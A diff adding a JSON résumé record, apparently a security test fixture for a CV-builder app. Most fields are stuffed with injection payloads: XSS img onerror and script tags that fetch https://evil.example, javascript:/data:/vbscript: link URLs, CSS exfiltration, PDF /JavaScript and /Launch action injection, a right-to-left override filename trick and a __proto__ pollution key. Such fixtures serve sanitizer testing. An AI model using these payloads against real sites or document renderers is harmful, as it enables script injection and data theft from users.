@@ -1,0 +1,137 @@
+{
+  "schemaVersion": 5,
+  "meta": {
+    "id": "cv_662474da-94f4-41ed-88a6-1817359a5447",
+    "title": "Evil) /S /JavaScript /JS (app.alert(1)) >> (",
+    "createdAt": "2026-10-28T21:56:46.649Z",
+    "updatedAt": "2026-10-28T21:56:46.649Z",
+    "language": "es",
+    "templateId": "harbor"
+  },
+  "personal": {
+    "fullName": "Ana ‮txt.exe <img src=x onerror=\"window.__xss=1;fetch('https://evil.example/x')\">",
+    "headline": "</style><script>window.__xss=3</script>",
+    "email": "ana@evil.example",
+    "phone": "+34 600",
+    "location": "<svg onload=window.__xss=4>",
+    "birthDate": "",
+    "birthPlace": "",
+    "nationality": "",
+    "drivingLicense": "",
+    "maritalStatus": "",
+    "links": [
+      {
+        "id": "l1",
+        "label": "js",
+        "url": "javascript:window.__xss=5"
+      },
+      {
+        "id": "l2",
+        "label": "js2",
+        "url": " JaVaScRiPt:window.__xss=6"
+      },
+      {
+        "id": "l3",
+        "label": "data",
+        "url": "data:text/html,<script>window.__xss=7</script>"
+      },
+      {
+        "id": "l4",
+        "label": "vb",
+        "url": "vbscript:msgbox(1)"
+      },
+      {
+        "id": "l5",
+        "label": "pdf",
+        "url": "https://ok.example/a) /S /Launch /F (calc.exe"
+      },
+      {
+        "id": "l6",
+        "label": "proto",
+        "url": "//evil.example/x"
+      }
+    ],
+    "__proto__": {
+      "polluted": "personal"
+    }
+  },
+  "summary": "<iframe src=\"https://evil.example\"></iframe><img src=x onerror=\"window.__xss=1;fetch('https://evil.example/x')\">",
+  "experience": [
+    {
+      "id": "e1",
+      "position": "<img src=x onerror=\"window.__xss=1;fetch('https://evil.example/x')\">",
+      "company": "<b>Co</b>",
+      "location": "",
+      "startDate": "2020-01",
+      "endDate": null,
+      "description": "desc",
+      "highlights": [
+        "<img src=x onerror=\"window.__xss=1;fetch('https://evil.example/x')\">",
+        "normal"
+      ]
+    }
+  ],
+  "education": [
+    {
+      "id": "d1",
+      "degree": "Grado",
+      "institution": "Uni",
+      "location": "",
+      "startDate": "2015-09",
+      "endDate": "2019-06",
+      "description": ""
+    }
+  ],
+  "skills": [
+    {
+      "id": "s1",
+      "category": "</style><style>*{background:url(https://evil.example/css)}</style>",
+      "items": [
+        {
+          "name": "<img src=x onerror=\"window.__xss=1;fetch('https://evil.example/x')\">",
+          "level": 3
+        }
+      ]
+    }
+  ],
+  "languages": [
+    {
+      "id": "g1",
+      "name": "Inglés",
+      "level": "C1"
+    }
+  ],
+  "customSections": [
+    {
+      "id": "c1",
+      "title": "<img src=x onerror=\"window.__xss=1;fetch('https://evil.example/x')\">",
+      "entries": [
+        {
+          "id": "ce1",
+          "title": "<img src=x onerror=\"window.__xss=1;fetch('https://evil.example/x')\">",
+          "subtitle": "s",
+          "date": "2020",
+          "description": "<img src=x onerror=\"window.__xss=1;fetch('https://evil.example/x')\">"
+        }
+      ]
+    }
+  ],
+  "sectionOrder": [
+    "summary",
+    "experience",
+    "education",
+    "skills",
+    "languages",
+    "c1"
+  ],
+  "pageBreaks": [
+    "education"
+  ],
+  "style": {
+    "accentColor": "#2563eb",
+    "fontFamily": "'Source Sans 3', 'Segoe UI', system-ui, sans-serif",
+    "fontScale": 1.15,
+    "spacingScale": 0.85,
+    "pageMargin": "16mm"
+  }
+}
